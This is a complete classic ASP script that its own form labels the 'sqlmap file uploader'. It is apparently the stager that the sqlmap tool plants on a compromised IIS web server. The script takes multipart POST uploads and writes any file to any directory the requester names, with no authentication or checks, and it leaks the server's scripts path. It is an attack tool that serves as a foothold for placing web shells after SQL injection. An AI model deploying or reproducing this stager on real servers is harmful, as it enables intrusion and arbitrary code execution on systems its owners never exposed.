<%
On Error resume Next
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Response.Buffer = true
Function BuildUpload(RequestBin)
     PosBeg = 1
     PosEnd = InstrB(PosBeg, RequestBin, getByteString(chr(13)))
     boundary = MidB(RequestBin, PosBeg, PosEnd-PosBeg)
     boundaryPos = InstrB(1, RequestBin, boundary)
     Do until (boundaryPos=InstrB(RequestBin, boundary & getByteString("--")))
          Dim UploadControl
          Set UploadControl = CreateObject("Scripting.Dictionary")
          Pos = InstrB(BoundaryPos, RequestBin, getByteString("Content-Disposition"))
          Pos = InstrB(Pos, RequestBin, getByteString("name="))
          PosBeg = Pos+6
          PosEnd = InstrB(PosBeg, RequestBin, getByteString(chr(34)))
          Name = getString(MidB(RequestBin, PosBeg, PosEnd-PosBeg))
          PosFile = InstrB(BoundaryPos, RequestBin, getByteString("filename="))
          PosBound = InstrB(PosEnd, RequestBin,boundary)
          If PosFile<>0 AND (PosFile<PosBound) Then
               PosBeg = PosFile + 10
               PosEnd = InstrB(PosBeg, RequestBin, getByteString(chr(34)))
               FileName = getString(MidB(RequestBin, PosBeg, PosEnd-PosBeg))
               UploadControl.Add "FileName", FileName
               Pos = InstrB(PosEnd, RequestBin, getByteString("Content-Type:"))
               PosBeg = Pos+14
               PosEnd = InstrB(PosBeg, RequestBin, getByteString(chr(13)))
               ContentType = getString(MidB(RequestBin, PosBeg, PosEnd-PosBeg))
               UploadControl.Add "ContentType", ContentType
               PosBeg = PosEnd+4
               PosEnd = InstrB(PosBeg, RequestBin, boundary)-2
               Value = MidB(RequestBin, PosBeg, PosEnd-PosBeg)
               Else
               Pos = InstrB(Pos, RequestBin, getByteString(chr(13)))
               PosBeg = Pos+4
               PosEnd = InstrB(PosBeg, RequestBin, boundary)-2
               Value = getString(MidB(RequestBin, PosBeg, PosEnd-PosBeg))
          End If
          UploadControl.Add "Value" , Value
          UploadRequest.Add name, UploadControl
          BoundaryPos=InstrB(BoundaryPos+LenB(boundary), RequestBin, boundary)
     Loop
End Function

Function getByteString(StringStr)
     For i = 1 to Len(StringStr)
          char = Mid(StringStr,i,1)
          getByteString = getByteString & chrB(AscB(char))
     Next
End Function

Function getString(StringBin)
     getString =""
     For intCount = 1 to LenB(StringBin)
          getString = getString & chr(AscB(MidB(StringBin,intCount,1)))
     Next
End Function

if Request.ServerVariables("REQUEST_METHOD") = "POST" then
     Response.Clear
     byteCount = Request.TotalBytes
     RequestBin = Request.BinaryRead(byteCount)
     Set UploadRequest = CreateObject("Scripting.Dictionary")
     BuildUpload(RequestBin)
     If UploadRequest.Item("file").Item("Value") <> "" Then
          contentType = UploadRequest.Item("file").Item("ContentType")
          filepathname = UploadRequest.Item("file").Item("FileName")
          filename = Right(filepathname, Len(filepathname)-InstrRev(filepathname,"\"))
          value = UploadRequest.Item("file").Item("Value")
	      uploadDir = UploadRequest.Item("uploadDir").Item("Value")
	      If uploadDir <> "WRITABLE_DIR" Then
               filename = uploadDir & "\" & filename
          End If
          Set MyFileObject = Server.CreateObject("Scripting.FileSystemObject")
          Set objFile = MyFileObject.CreateTextFile(filename, True)
          If Err.Number <> 0 Then
               response.write("Error: " & Err.Description)
               Error.Clear
          Else
               On Error Goto 0
               For i = 1 to LenB(value)
               objFile.Write chr(AscB(MidB(value,i,1)))
               Next
               objFile.Close
               Set objFile = Nothing
               Set MyFileObject = Nothing
               response.write("File uploaded")
          End If
     End If
     Set UploadRequest = Nothing
Else
     response.write("<form action=" & Request.ServerVariables("SCRIPT_NAME") & " method=POST enctype=multipart/form-data><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=""WRITABLE_DIR""><input type=submit name=upload value=upload><input type=hidden name=scriptsdir value=""" & Server.Mappath("/scripts/") & """></form>")
End If
%>
